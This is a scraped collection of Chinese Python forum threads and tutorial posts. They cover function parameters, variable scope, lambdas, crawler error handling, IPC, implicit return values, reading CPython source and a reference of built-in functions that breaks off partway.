ret()\n123\nTrue\n</code></pre>\n<h2>位置参数</h2>\n<p>传入参数的值是按照顺序依次赋值过去的。</p>\n<p>代码</p>\n<pre><code># x==形式参数，形式参数有几个，那么实际参数就要传几个，默认参数除外\ndef ret(x):\n    print(x)\n# \"Hello Word\"实际参数\nprint(ret(\"Hello Word\"))\n</code></pre>\n<p>执行结果</p>\n<pre><code>Hello Word\n</code></pre>\n<p>如图所示:\n<img alt=\"Python-Day04-04\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483016903.png\"></p>\n<p>ret 小括号内的值会被传入到函数 ret 里面都能做 x 的值，结果差不多就是<code>print(\"Hello Word\")</code></p>\n<h3>函数的普通参数实例：发送邮件</h3>\n<pre><code>def email(mail):\n    import smtplib\n    from email.mime.text import MIMEText\n    from email.utils import formataddr\n\n    msg = MIMEText('邮件内容', 'plain', 'utf-8')\n    msg['From'] = formataddr([\"测试\",'asdasd@126.com'])\n    msg['To'] = formataddr([\"走人\",'asdasdasd@163.com'])\n    msg['Subject'] = \"主题\"\n\n    server = smtplib.SMTP(\"smtp.126.com\", 25)\n    server.login(\"wdfgfghfgh@126.com\", \"123456\")\n    server.sendmail('asdasdas@126.com', [mail,], msg.as_string())\n    server.quit()\n\nemail(\"6087414@qq.com\")\n</code></pre>\n<p>当执行这个脚本的时候会给邮箱<code>6087414@qq.com</code>发送邮件。</p>\n<p><strong>注：</strong>上面的邮箱地址等都是随便写的，请自行更改</p>\n<h2>指定参数</h2>\n<pre><code>&gt;&gt;&gt; def ret(a,b,c):\n...  print(a,\"a\")\n...  print(b,\"b\")\n...  print(c,\"c\")\n...\n&gt;&gt;&gt; ret(b=\"bbb\",a=\"aaa\",c=\"ccc\")\naaa a\nbbb b\nccc c\n</code></pre>\n<p>默认情况在再函数 ret 括号内如果要输入函数参数的值，是要按照顺序来的，但是如果在 ret 括号内制定的参数的值，那么就不需要按照顺序来了。</p>\n<h2>默认参数</h2>\n<p>如果我们在创建函数的时候给函数定义了值，那么在调用函数的时候如果不填写值程序就会报错：</p>\n<pre><code>&gt;&gt;&gt; def ret(x):\n...  print(x)\n...\n&gt;&gt;&gt; ret()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: ret() missing 1 required positional argument: 'x'\n</code></pre>\n<p>如果要解决这个问题就可以给函数的值指定一个默认值，指定函数的默认值需要在<code>def</code>这一行指定，制定之后，当调用这个函数的时候就不需要输入函数值了。</p>\n<pre><code>&gt;&gt;&gt; def ret(x=\"Hello Word\"):\n...  print(x)\n...\n&gt;&gt;&gt; ret()\nHello Word\n# 如果值指定默认值，那么实际参数替换掉形式参数\n&gt;&gt;&gt; ret(\"Pythoner\")\nPythoner\n</code></pre>\n<p>如果给函数创建了默认值，那么有默认值的这个参数必须在最后面定义，不能够在没有默认参数的值的前面。</p>\n<h2>动态参数</h2>\n<p>动态参数把接收过来的实际参数当作一个元组，每一个参数都是元组中的一个元素。</p>\n<p><strong>第一种动态参数</strong></p>\n<p>定义第一种动态参数需要在参数前面加上一个<code>*</code>号</p>\n<pre><code>&gt;&gt;&gt; def ret(*args):\n...  print(args,type(args))\n...\n&gt;&gt;&gt; ret(11,22,33)\n(11, 22, 33) &lt;class 'tuple'&gt;\n</code></pre>\n<p><strong>第二种动态参数</strong></p>\n<p>定义第二种动态参数需要在参数前面加上两个<code>*</code>号，给参数传参的时候是一个 key 对应一个 value 的，相当于一个字典的键值对，而且返回的类型就是字典类型。</p>\n<p>使用两个星号可以将参数收集到一个字典中，参数的名字是字典的键，对应参数的值是字典的值。</p>\n<pre><code>&gt;&gt;&gt; def ret(**kwargs):\n...  print(kwargs,type(kwargs))\n...\n&gt;&gt;&gt; ret(k1=123,k2=456)\n{'k1': 123, 'k2': 456} &lt;class 'dict'&gt;\n</code></pre>\n<p><strong>第三种动态参数</strong></p>\n<p>第三种又称为万能的动态参数，如下实例：</p>\n<pre><code>&gt;&gt;&gt; def ret(*args,**kwargs):\n...  print(args,type(args))\n...  print(kwargs,type(kwargs))\n...\n&gt;&gt;&gt; ret(11,222,333,k1=111,k2=222)\n(11, 222, 333) &lt;class 'tuple'&gt;\n{'k1': 111, 'k2': 222} &lt;class 'dict'&gt;\n</code></pre>\n<p>字典小例子：</p>\n<pre><code>&gt;&gt;&gt; def arg(**kwargs):\n...  print(kwargs,type(kwargs))\n...\n&gt;&gt;&gt; dic = {\"k1\":123,\"k2\":456}\n&gt;&gt;&gt; arg(k1=dic)\n{'k1': {'k1': 123, 'k2': 456}} &lt;class 'dict'&gt;\n&gt;&gt;&gt; arg(**dic)\n{'k1': 123, 'k2': 456} &lt;class 'dict'&gt;\n</code></pre>\n<h2>避免可变参数的修改</h2>\n<p>如果不想在函数内部修改参数值而影响到外部对象的值，我们可以使用切片的方式进行参数的传递：</p>\n<pre><code>#!/use/bin/env python\n\nL = ['a', 'b']\ndef changer(L):\n    L[0] = 0\nprint(L)\nchanger(L)\n\"\"\"\n['a', 'b']\n[0, 'b']\n\"\"\"\n# changer(L[:])\n\"\"\"\n['a', 'b']\n['a', 'b']\n\"\"\"\nprint(L)\n</code></pre>\n<h2>参数解包</h2>\n<pre><code>In [2]: def f(a, b, c, d): print(a, b, c, d)\n\nIn [3]: args = (1, 2)\n\nIn [4]: args += (3, 4)\n\nIn [5]: f(*args)\n1 2 3 4\n</code></pre>\n<p>又或者使用</p>\n<pre><code>def f(a, b, c, d): print(a, b, c, d)\nargs = {'a': 1, 'b': 2, 'c': 3, 'd': 4}\nf(**args)\n</code></pre>\n<h2>参数书写位置</h2>\n<p><strong>在函数调用中：</strong> 位置参数 --》 关键字参数 --》元组形式--》字典形式\n<strong>在函数头部：</strong> 一般参数--》默认参数--》元组形式--》字典形式</p>\n<pre><code>def func(name, age=None, *args, **kwargs):\n    print(name, age, args, kwargs)\n\nfunc('ansheng', 18, *(1, 2, 3), **{'blog': 'blog.ansheng.me'})\n</code></pre>\n<h2>全局变量和局部变量</h2>\n<p>简单的理解全局变量和变量，全局变量可以理解为在当前这个文件内定义的变量，局部变量则是在函数内定义的变量，如下例：</p>\n<pre><code># qa\n# 全局变量\nn1 = 1\ndef num():\n\t# 局部变量\n    n2 = 2\n    print(n1)\n    print(n2)\nnum()\n</code></pre>\n<p>输出的结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day05/def.py\n1\n2\n</code></pre>\n<p>定义的全局变量都可以在函数内调用，但是不能再函数内修改，局部变量在也不能够直接调用，如果要在函数内修改全局变量，那么就需要用到关键字``</p>\n<pre><code>n1 = 1\ndef num():\n    n2 = 2\n    global n1\n    n1 = 3\n    print(n1)\n    print(n2)\nnum()\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day05/def.py\n3\n2\n</code></pre>\n<h2>nonlocal 语句</h2>\n<p><code>nonlocal</code>是用来修改嵌套作用域中的变量，类似于<code>global</code>一样，只需要在嵌套函数中声明变量名即可，但是这个变量名是必须已经存在的否则就会报错，如果要修改的变量在作用域中查找不到，那么不会继续到全局或内置作用域中查找。</p>\n<pre><code>In [1]: def func1(arg1):\n   ...:     n = arg1\n   ...:     print(n)\n   ...:     def func2():\n   ...:         nonlocal n\n   ...:         n += 1\n   ...:     func2()\n   ...:     print(n)\n   ...:     \n\nIn [2]: func1(10)\n10\n11\n</code></pre>\n<h2>Lambda 表达式</h2>\n<p>Lambda （ Lambda expressions ）表达式是用 lambda 关键字创建的匿名函数， Lambda 函数可以用于任何需要函数对象的地方，在语法上，它们被局限于只能有一个单独的表达式。</p>\n<p>使用<code>Lambda</code>表达式创建函数</p>\n<pre><code>&gt;&gt;&gt; f = lambda x,y : x + y\n&gt;&gt;&gt; f(1,2)\n3\n</code></pre>\n<p>使用 def 创建函数</p>\n<pre><code>&gt;&gt;&gt; def f(x,y):\n...  return x + y\n...\n&gt;&gt;&gt; f(1,2)\n3\n</code></pre>\n<p>对于比较简单的函数我们就可以通过 lambda 来创建，它的的好处是缩短行数。</p>\n<p>lambda 创建的函数和 def 创建的函数对应关系如图所示：</p>\n<p><img alt=\"Python-Day05-01\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483017178.png\"></p>\n<h3>嵌套 lambda 和作用域</h3>\n<pre><code>def action(x):\n    return (lambda y: x + y)\n\nact = action(99)\nprint(act)\nresult = act(2)\nprint(result)\n</code></pre>\n<p>输出为：</p>\n<pre><code>&lt;function action.&lt;locals&gt;.&lt;lambda&gt; at 0x1021e6400&gt;\n101\n</code></pre>\n<p><code>lambda</code>也能够获取到任意上层<code>lambda</code>中的变量名：</p>\n<pre><code>action = lambda x: (lambda y: x + y)\nact = action(99)\nprint(act)\nresult = act(3)\nprint(result)\n</code></pre>\n<p>输出为：</p>\n<pre><code>&lt;function &lt;lambda&gt;.&lt;locals&gt;.&lt;lambda&gt; at 0x1029e6400&gt;\n102\n</code></pre>\n<h2>测试题</h2>\n<h3>第一题</h3>\n<p><strong>简述普通参数、指定参数、默认参数、动态参数的区别</strong></p>\n<p>普通参数即是用户在调用函数是填入的参数，且参数位置必须与参数保持一致。</p>\n<p>指定参数即在用户调用函数的时候不需要按照函数中参数的位置中所填写，指定参数是需要制定参数对应的值。</p>\n<p>默认参数可以写在定义参数的后面，如果用户调用函数是没有制定参数，那么就会用默认参数，如果用户指定了参数，那么用户指定的参数就会代替默认参数。</p>\n<p>动态参数可以接受用户输入的任何参数，包括字典、列表、元组等数据类型。</p>\n<h3>第二题</h3>\n<p>计算传入字符串中数字、字母、空格以及其他的个数</p>\n<pre><code>def var(s):\n    all_num = 0\n    spance_num = 0\n    digit_num = 0\n    others_num = 0\n    for i in s:\n        # 检测数字\n        if i.isdigit():\n            digit_num += 1\n        # 检测空格\n        elif i.isspace():\n            spance_num += 1\n        # 检测字母\n        elif i.isalpha():\n            all_num += 1\n        else:\n            # 其他\n            others_num += 1\n    return (\"字母：\",all_num,\"空格：\",spance_num,\"数字\",digit_num,\"其他字符\",others_num)\nnum = var(\"21323 asd*%^*^% &amp;*213asdasdasda sdasdasd\")\nprint(num)\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/operation/Day05/c.py\n('字母：', 21, '空格：', 3, '数字', 8, '其他字符', 8)\n</code></pre>\n<h3>第三题</h3>\n<p>写函数，判断用户传入的对象（字符串、列表、元组）长度是否大于 5 ，如果大于 5 就返回 True ，如果小于 5 就返回 False</p>\n<pre><code># 定义一个函数 num\ndef num(x):\n    # 判断函数的值如果长度大于 5 就返回 True\n    if len(x) &gt; 5:\n        return True\n    # 否则就返回 False\n    else:\n        return False\n\nret = num([\"asd\",\"asdasd\",\"asdasd\",\"asdasd\"])\nprint(ret)\nret = num(\"asdasdasd\")\nprint(ret)\n</code></pre>\n<h3>第四题</h3>\n<p>写函数，检查用户传入的对象（字符串、列表、元组）的每一个元素是否含有空内容，如果有空就返回 False</p>\n<pre><code># 定义一个函数 num\ndef num(x):\n    # 循环输出 num 内的所有内容\n    for n in x:\n        # 数据类型转换为字符串\n        n = str(n)\n        # 如果有空格就返回 False\n        if n.isspace():\n            return False\n\nret = num(\" \")\nprint(ret)\n\nret = num(\"asdasd\")\nprint(ret)\n\nret = num([\"asd\",\"312\",123,\" \"])\nprint(ret)\n</code></pre>\n<h3>第五题</h3>\n<p>写函数，检查传入列表的长度，如果大于 2 ，那么仅保留前两个长度的内容，并将新内容返回给调用者。</p>\n<pre><code>def num(x):\n    # 如果列表中的长度大于 2,那么就输出列表前两个内容，否则就返回一个空\n    if len(x) &gt; 2:\n        return x[:2]\n    else:\n        return \"\"\nprint(num([\"11\",\"22\",\"33\"]))\n\nprint(num([\"33\"]))\n</code></pre>\n<h3>第六题</h3>\n<p>写函数，检查获取传入列表或元组对象的所有奇数位索引对应的元素，并将其作为新列表返回给调用者。</p>\n<pre><code>def num(x):\n    # 定义一个空列表用于接收奇数位的元素\n    resule = []\n    # 循环输出列表中的所有元素值\n    for n in range(len(x)):\n        # 如果列表中的位置为奇数就把值添加到 resule 列表中\n        if n % 2 == 1:\n            resule.append(x[n])\n    # 然会 resule 列表中的内容\n    return resule\n\nret = num([11,22,33,44,55,66])\nprint(ret)\n</code></pre>\n<h3>第七题</h3>\n<p>写函数，检查传入字典的每一个 value 的长度,如果大于 2 ，那么仅保留前两个长度的内容，并将新内容返回给调用者。</p>\n<pre><code>dic = {\"k1\": \"v1v1\", \"k2\": [1111,22,33,44]}\n</code></pre>\n<p>PS:字典中的 value 只能是字符串或列表</p>\n<p>代码</p>\n<pre><code>def dictt(x):\n    # 循环字典中所有的 key\n    for k in x.keys():\n        # 如果字典中 k 对应的元素是字符串类型就下面的判断\n        if type(x[k]) == str:\n            # 如果元素的长度大于 2\n            if len(x[k]) &gt; 2:\n                # 那么就让这个元素重新赋值，新的值只保留原来值的前两个\n                x[k]=x[k][0:2]\n        # 如果字典中 k 对应的元素类型是列表，就进入下面的判断\n        elif type(x[k]) == list:\n            # 先把列表中的值全部 for 循环\n            for i in x[k]:\n                # 把元素转换为字符串\n                string = str(i)\n                # 如果元素的长度大于 2\n                if len(string) &gt; 2:\n                    # 获取元素的索引值\n                    num = x[k].index(i)\n                    # 先把这个元素给删除\n                    x[k].pop(x[k].index(i))\n                    # 然后再添加一个新的元素，新元素的只保留原来元素的前两个\n                    x[k].insert(num,string[:2])\n    # 把结果 return 出来\n    return dic\nret = dictt(dic)\nprint(ret)\n</code></pre>\n<ul>\n<li>执行结果</li>\n</ul>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/operation/Day05/h.py\n{'k1': 'v1', 'k2': ['11', 22, 33, 44]}\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python全栈之路系列文章</a></p>\n</div></div>"], "reply": "5", "tittle": "Python 全栈之路系列之函数", "comment": ["标题喜感", "写这么多不容易，分享出来始终是好事。", " 虽然写的并不是特别好。", " \r", "\r", "Python 全栈，哈哈哈", "感谢分享。"]},
{"content": ["<div class=\"topic_content\">如题，爬虫运行的时候难免会遇到各种意外，很有可能导致整个程序都终止。。。。\r<br>\r<br>各位大佬一般是怎么解决的？</div>"], "reply": "18", "tittle": "经常写爬虫的大佬们是如何不让程序中断的？", "comment": ["Try..Except...", "Supervisor", "还是对库的行为不熟悉吧 233\r", "直接 panic 的库当然就不要用了，除非做的是随时崩溃随时恢复", "catch 。", "查一下文档这个函数会抛什么异常，都接住就好……", "try:\r", "except:\r", "pass", "python ？\r", "每个任务最外侧接住所有异常并打印日志。", "难道不是 try catch 么，然后最好通知和记录，这个点爬不下去了继续爬别的点，如果出现大量错误做更高级别的通知，比如 server 酱啊，或者发个邮件啊，就这样。", "打好 log 就好", "let it crash", "另外再补充下非爬虫涉及第三方的复杂任务，直接 multiprocessing.Process 另起一个进程来跑，出故障也只是任务进程出问题，主进程不会出问题，超时之类的情况直接杀子进程的进程树树，方便。", " 老司机😏", "一般用 queue 做多线程任务队列，然后在 worker 线程上先处理已知可能出现的 exception ，然后再套一个 except Exception 来抓未知的。\r", "\r", "最后正常的任务会放到完成 queue 里，跳了未知 exception 的会放到一个 error queue 里，这样你可以人工处理完之后把 error queue 的全都倒回待处理 queue 里。\r", "\r", "当然，肯定需要完整的 log 才方便查错了", "用 REDIS 做队列，失败的用 TRY EXCEPT 再 PUSH 到未爬队列里", "抛出一个异常，然后记录下来，以后再尝试呗", "用 scrapy 啊，而且爬之前要尽量搞清楚哪里会抛异常，并标记 try except 。", "为什么会全部停止？单线程爬取？\r", "开多线程的话，暴力点处理就是在线程最外面 catch 所有异常，记下本次抓取的 url ，重新投递到任务队列。\r", "对获取不成功的 url 进行重试计数，超过重试次数限制的就不再投递到任务队列，记下来，人工处理。", "try catch 啊", "守护进程"]},
{"content": ["<div class=\"topic_content\">我想在另一个进程里新建对象（涉及到资源复用），想好的手工的做法是进程间建立套接字连接，对象的 API 通过 socket 封装调用。我怕自己又要造轮子了，先来问问是否已有现成的模块实现了这种功能？</div>"], "reply": "6", "tittle": "如何通过 IPC (socket)操作另一个进程里的对象", "comment": ["rpyc", "RPC 适合楼主的需求。有个包叫做 Pyro(Python remote object)可以看看", "我也和楼主有一样的需求，所以最后自己造了一个轮子，不过是用 Redis 进行数据交互的", "。。。。。。我希望能早几天看到这个帖子。。。。。。 Orz", "当自己遇到奇怪的需求时，先花时间想一想这个思路是不是有问题  ", "另外如果真要是做的话这个就是 RPC 没商量", "openbinder"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>known = {0:0,1:1}\na = [1,2,3]\ndef example():\n    known[2] =1\n    a[2]=3\n    print(known,a)\n\nexample()\n\n＃但是如果是下面\n\nbeen_called ＝ Ture\n\ndef example2():\n    print(been_called)\n    been_called = True\n    print(been_called)\n\n语法错误，必须：\ndef example2():\n    global been_called\n    print(been_called)\n    been_called = True\n    print(been_called)\n\n\n</code></pre>\n</div></div>"], "reply": "17", "tittle": "Python 的全局变量的理解。", "comment": ["anti-pattern \r", "不要在函数 scope 里边乱动全局变量", "第一个 example2 函数的第 2 行\"been_called = True\"把变量\"been_called\"定义成了该函数的局部变量，所以执行\"print(been_called)\"的时候\"been_called\"还没初始化，报 UnboundLocalError", " 这个我知道， 为什么列表，字典不受影响。", " 因为你并没有在 example 函数里重新声明（初始化） a 和 know ，只是引用了而已", " 与列表字典无关，你试一下在 example()最后加一个 known={}就明白了", "  \r", "\r", "```python\r", "\r", "count = 0\r", "\r", "def example4():\r", "    count +=1\r", "\r", "\r", "\r", "这个也是引用也没有声明，但是语法也是错误的， 必须这样\r", "global count\r", "\r", "```", " count += 1  ===  count = count + 1 ，重新声明了", "去看看 python 里的可变对象和不可变对象。", "  谢谢", "\r", "\r", "去看一下 LEGB 的规则你就懂了", " 你字典只是引用 不是用 ＝ 赋值 所以地址不变", "如果你要在函数中改动全局变量，就必须有 global 声明。若光是读全局变量则不需要。\r", "\r", "你的第一个 example 里，读了全局变量 a ，但并没有改动 a （还是指向同一个 list ）。具体来说，你干的事情是：读到了 list a ，取了第三个元素并把它 refer 到 3 。 dict 同理。", "python 会 precheck 你的 scope 看你定一了 been_called 就认为是本地 variable 了", "引用和非引用的区别", "\"UnboundLocalError: local variable 'been_called' referenced before assignment\"，\r", "摘取 stackoverflow 的解释——\r", "Basically the rule is: If you try to assign a global variable from within a function, you need to use the global keyword within that function. Otherwise you don't need the global keyword at all. Whether or not the variable is a boolean makes no difference.", "最内嵌套作用域规则：由一个赋值语句引进的名字在这个赋值语句所在的作用域里是可见（起作用）的，而且在其内部嵌套的每个作用域里也可见，除非它被嵌套与内部的，引进同样名字的另一条赋值语句所遮蔽。", "楼主的 True 拼写错为 Ture, 没人发现吗?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>受之前一篇文章的启发，想到了一个问题，文章中写道</p>\n<pre><code>def re(x):\n    print(x)\n\nprint(re('hello world'))\n</code></pre>\n<p>执行之后的得到</p>\n<pre><code>hello world\n</code></pre>\n<p>但是实际情况是后面还会跟着一个</p>\n<pre><code>None\n</code></pre>\n<p>然后就突然想到之前在返回 None 的时候有的时候会简写成</p>\n<pre><code>def fun(x):\n    something\n    if some_reason:\n        return\n    else:\n        return something\n</code></pre>\n<p>所以说在无返回值的时候，这个 return 是可有可无的，还是会对代码造成一定的影响？</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>下午闲暇时间去翻了翻文档，发现在关于return有这么一段描述</p>\n<blockquote>\n<p>return may only occur syntactically nested in a function definition, not within a nested class definition.</p>\n<p>If an expression list is present, it is evaluated, else None is substituted.</p>\n<p>return leaves the current function call with the expression list (or None) as return value.</p>\n<p>When return passes control out of a try statement with a finally clause, that finally clause is executed before really leaving the function.</p>\n<p>In a generator function, the return statement indicates that the generator is done and will cause StopIteration to be raised. The returned value (if any) is used as an argument to construct StopIteration and becomes the StopIteration.value attribute.</p>\n</blockquote>\n<p>似乎是如果不写return语句，那么默认函数结尾会return None</p>\n<p>顺带发现了新东西，<strong>exciting！</strong></p>\n</div></div>"], "reply": "15", "tittle": "Python 的无返回值函数末尾写与不写 return 对代码有无影响", "comment": ["没有区别", "return 后没有东西会返回 None", "你这是真 函数式编程", "默认返回 None\r", "既然没返回值了，直接用函数去好了", "这个 re(x) 函数不是得到 x, 而是打印 x, 得到 none. 打印 x 是副作用。\r", "\r", "真正需要考虑的是这个函数要返回什么，如果要返回的刚好就是 none, 就可以省掉 return 了，如果要返回别的东西，比如不打印 x 而是返回 x, 自然就需要写 return 。", "\r", "直接看 dis.dis 就好", "如果是明确想要返回 None ，还是主动返回比较好\r", "代码更清晰容易维护，也防自己忘了的坑\r", "性能不需要担心", "所以说，在无返回值函数的最末尾， return None ， return 以及不写最后的 return 对函数整体没有影响，写不写只会影响最后维护，写了比较清晰，不写也不会导致代码性能不佳的问题", "有些语言可以检查规范要求必须有显示 return 。 python 却没有，很容易出问题。", "看你个人喜好了", "None 为 Python 里的 uint type ，所以，默认无返回的函数返回 None", "函数没有返回值的时候默认就会返回 None ，所以不奇怪，而且你这个 print(re('hello world'))，输出的是 re 的返回值，", "是啊，你就是返回 re 这个函数的返回值。\r", "如果你不需要返回值，那你 print 也可以去掉。", "我是有次忘了写返回就发现 python 是默认返回 none 的，所以一看到 print 出 None 就知道自己忘写返回值了。\r", "后来写 c 就养成默认要 return 0", "In [1]: import dis\r", "\r", "In [2]: def f1():\r", "   ...:     pass\r", "   ...:\r", "\r", "In [3]: def f2():\r", "   ...:     return\r", "   ...:\r", "\r", "In [4]: def f3():\r", "   ...:     return None\r", "   ...:\r", "\r", "In [5]: dis.dis(f1)\r", "  2           0 LOAD_CONST               0 (None)\r", "              3 RETURN_VALUE\r", "\r", "In [6]: dis.dis(f2)\r", "  2           0 LOAD_CONST               0 (None)\r", "              3 RETURN_VALUE\r", "\r", "In [7]: dis.dis(f3)\r", "  2           0 LOAD_CONST               0 (None)\r", "              3 RETURN_VALUE"]},
{"content": ["<div class=\"topic_content\">最近打算看下 CPython 的源码，但是试过 Xcode ， PyCharm 都不给力。没办法用快捷键追踪所调用的函数来源。\r<br>是不是我打开的姿势不对？\r<br>\r<br>求老司机带路……^_^</div>"], "reply": "7", "tittle": "求教怎么看 CPython 源码比较顺手？", "comment": ["《 python 源码剖析》好书", " 我是想直接在电脑里看 CPython 的实现细节啊", "我看代码用 VSCode ，编译调试用 VS ", "  ，编译用的比较少。", "CPython 是 C 代码， PyCharm 是 Python IDE\r", "不能用 PyCharm 来看 C 代码啊\r", "\r", "可以用 VSCode 或者 CLion", "vim ctags cscope", "Source Insight", "Source Insight 是 Windows 上审计 C/C++代码的好工具"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>The Python interpreter has a number of functions and types built into it that are always available. They are listed here in alphabetical order.</p>\n<h2>内置函数详解</h2>\n<p>abs(x)</p>\n<blockquote>\n<p>返回数字的绝对值，参数可以是整数或浮点数，如果参数是复数，则返回其大小。</p>\n</blockquote>\n<pre><code># 如果参数是复数，则返回其大小。\n &gt;&gt;&gt; abs(-25)\n25\n &gt;&gt;&gt; abs(25)\n25\n</code></pre>\n<p>all(iterable)</p>\n<blockquote>\n<p>all()会循环括号内的每一个元素，如果括号内的所有元素都是真的，或者如果 iterable 为空，则返回<code>True</code>，如果有一个为假的那么就返回<code>False</code></p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; all([])\nTrue\n&gt;&gt;&gt; all([1,2,3])\nTrue\n&gt;&gt;&gt; all([1,2,\"\"])\nFalse\n# 如果有一个为假，则都为假\n&gt;&gt;&gt; all([1,2,None])\nFalse\n</code></pre>\n<p>假的参数有：<code>False</code>、<code>0</code>、<code>None</code>、<code>\"\"</code>、<code>[]</code>、<code>()</code>、<code>{}</code>等，查看一个元素是否为假可以使用 bool 进行查看。</p>\n<p>any(iterable)</p>\n<blockquote>\n<p>循环元素，如果有一个元素为真，那么就返回 True ，否则就返回 False</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; any([0,1])\nTrue\n &gt;&gt;&gt; any([0])\nFalse\n</code></pre>\n<p>ascii(object)</p>\n<blockquote>\n<p>在对象的类中寻找<code>__repr__</code>方法，获取返回值</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; class Foo:\n ...  def __repr_(self):\n ...     return \"hello\"\n ...\n &gt;&gt;&gt; obj = Foo()\n &gt;&gt;&gt; r = ascii(obj)\n &gt;&gt;&gt; print(r)\n# 返回的是一个可迭代的对象\n&lt;__main__.Foo object at 0x000001FDEE13D320&gt;\n</code></pre>\n<p>bin(x)</p>\n<p>将整数 x 转换为二进制字符串，如果 x 不为 Python 中 int 类型， x 必须包含方法<code>__index__()</code>并且返回值为<code>integer</code></p>\n<pre><code># 返回一个整数的二进制\n &gt;&gt;&gt; bin(999)\n'0b1111100111'\n</code></pre>\n<pre><code># 非整型的情况，必须包含__index__()方法切返回值为 integer 的类型\n &gt;&gt;&gt; class myType:\n ...   def __index__(self):\n ...       return 35\n ...\n &gt;&gt;&gt; myvar = myType()\n &gt;&gt;&gt; bin(myvar)\n'0b100011'\n</code></pre>\n<p>bool([x])</p>\n<p>查看一个元素的布尔值，非真即假</p>\n<pre><code> &gt;&gt;&gt; bool(0)\nFalse\n &gt;&gt;&gt; bool(1)\nTrue\n &gt;&gt;&gt; bool([1])\nTrue\n &gt;&gt;&gt; bool([10])\nTrue\n</code></pre>\n<p>bytearray([source [, encoding [, errors]]])</p>\n<blockquote>\n<p>返回一个 byte 数组， Bytearray 类型是一个可变的序列，并且序列中的元素的取值范围为 [0 ,255]。</p>\n</blockquote>\n<p>source 参数：</p>\n<ol>\n<li>如果 source 为整数，则返回一个长度为 source 的初始化数组；</li>\n<li>如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列；</li>\n<li>如果 source 为可迭代类型，则元素必须为[0 ,255]中的整数；</li>\n<li>如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始化 bytearray.。</li>\n</ol>\n<pre><code> &gt;&gt;&gt; bytearray(3)\nbytearray(b'\\x00\\x00\\x00')\n</code></pre>\n<p>bytes([source[, encoding[, errors]]])</p>\n<pre><code> &gt;&gt;&gt; bytes(\"asdasd\",encoding=\"utf-8\")\nb'asdasd'\n</code></pre>\n<p>callable(object)</p>\n<blockquote>\n<p>返回一个对象是否可以被执行</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; def func():\n ...  return 123\n ...\n &gt;&gt;&gt; callable(func)\nTrue\n &gt;&gt;&gt; func = 123\n &gt;&gt;&gt; callable(func)\nFalse\n</code></pre>\n<p>chr(i)</p>\n<blockquote>\n<p>返回一个数字在 ASCII 编码中对应的字符，取值范围 256 个</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; chr(66)\n'B'\n &gt;&gt;&gt; chr(5)\n'\\x05'\n &gt;&gt;&gt; chr(55)\n'7'\n &gt;&gt;&gt; chr(255)\n'\\xff'\n &gt;&gt;&gt; chr(25)\n'\\x19'\n &gt;&gt;&gt; chr(65)\n'A'\n</code></pre>\n<p>classmethod(function)</p>\n<blockquote>\n<p>返回函数的类方法</p>\n</blockquote>\n<p>compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)</p>\n<blockquote>\n<p>把字符串编译成 python 可执行的代码</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; str = \"for i in range(0,10): print(i)\"\n &gt;&gt;&gt; c = compile(str,'','exec')\n &gt;&gt;&gt; exec(c)\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n</code></pre>\n<p>complex([real[, imag]])</p>\n<blockquote>\n<p>创建一个值为 real + imag * j 的复数或者转化一个字符串或数为复数。如果第一个参数为字符串，则不需要指定第二个参数</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; complex(1, 2)\n(1+2j)\n# 数字\n &gt;&gt;&gt; complex(1)\n(1+0j)\n# 当做字符串处理\n &gt;&gt;&gt; complex(\"1\")\n(1+0j)\n# 注意：这个地方在“+”号两边不能有空格，也就是不能写成\"1 + 2j\"，应该是\"1+2j\"，否则会报错\n &gt;&gt;&gt; complex(\"1+2j\")\n(1+2j)\n</code></pre>\n<p>delattr(object, name)</p>\n<blockquote>\n<p>删除对象的属性值</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; class cls:\n...   @classmethod\n...   def echo(self):\n...     print('CLS')\n... \n&gt;&gt;&gt; cls.echo()\nCLS\n&gt;&gt;&gt; delattr(cls, 'echo')\n&gt;&gt;&gt; cls.echo()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nAttributeError: type object 'cls' has no attribute 'echo'\n</code></pre>\n<p>dict(**kwarg)</p>\n<blockquote>\n<p>创建一个数据类型为字典</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; dic = dict({\"k1\":\"123\",\"k2\":\"456\"})\n &gt;&gt;&gt; dic\n{'k1': '123', 'k2': '456'}\n</code></pre>\n<p>dir([object])</p>\n<blockquote>\n<p>返回一个对象中中的所有方法</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; dir(str)\n['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce\\_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isdecimal', 